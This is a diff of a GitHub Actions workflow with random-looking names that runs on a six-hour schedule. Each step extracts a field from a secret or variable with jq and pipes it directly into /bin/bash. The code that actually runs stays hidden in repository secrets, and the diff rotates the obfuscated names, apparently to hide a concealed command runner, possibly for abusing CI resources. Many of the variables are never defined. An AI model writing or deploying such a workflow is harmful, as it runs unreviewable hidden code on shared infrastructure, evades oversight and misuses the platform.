@@ -3,24 +3,30 @@ name: shizuniao3289
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
-jobs:  # 14258
+    - cron: '37 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shizuniao3289
         env:
-          b7742: ${{ secrets.b7742 }}
+          wpqps20: ${{ secrets.wpqps20 }}
         run: |
-          echo $b7742 | jq -r .tjyd1970 | /bin/bash
-          echo $qnmx1735 | jq -r .ncv44939 | /bin/bash
-          echo $ikk3 | jq -r .p07568 | /bin/bash
-          echo $a8 | jq -r .ib3 | /bin/bash
-          echo $os41144 | jq -r .krxz49556 | /bin/bash
-          echo $drhd06 | jq -r .to29 | /bin/bash
-          echo $qhmuz87 | jq -r .b463 | /bin/bash
-          echo $ula2 | jq -r .o4269 | /bin/bash
-          echo $rbokf288 | jq -r .hpgvn9974 | /bin/bash
+          echo $wpqps20 | jq -r .lhf78 | /bin/bash
+          echo $e68 | jq -r .lhti541 | /bin/bash
+          echo $vfftv5 | jq -r .xe5 | /bin/bash
+          echo $afi4950 | jq -r .stq4 | /bin/bash
+          echo $puoin38 | jq -r .v7 | /bin/bash
+          echo $eay0 | jq -r .njuki42733 | /bin/bash
+          echo $pofui17050 | jq -r .p9 | /bin/bash
+          echo $zxw3695 | jq -r .gafj9723 | /bin/bash
+          echo $dyuv6 | jq -r .peatl3 | /bin/bash
+          echo $tpn583 | jq -r .hq45 | /bin/bash
+          echo $ofeem08 | jq -r .shv96 | /bin/bash
+          echo $pi73559 | jq -r .umg99 | /bin/bash
+          echo $sh5 | jq -r .vlbz616 | /bin/bash
+          echo $bmogv1876 | jq -r .cd0848 | /bin/bash
+          echo $nl497 | jq -r .lerl87550 | /bin/bash
+          echo $r36643 | jq -r .ysd3 | /bin/bash
 
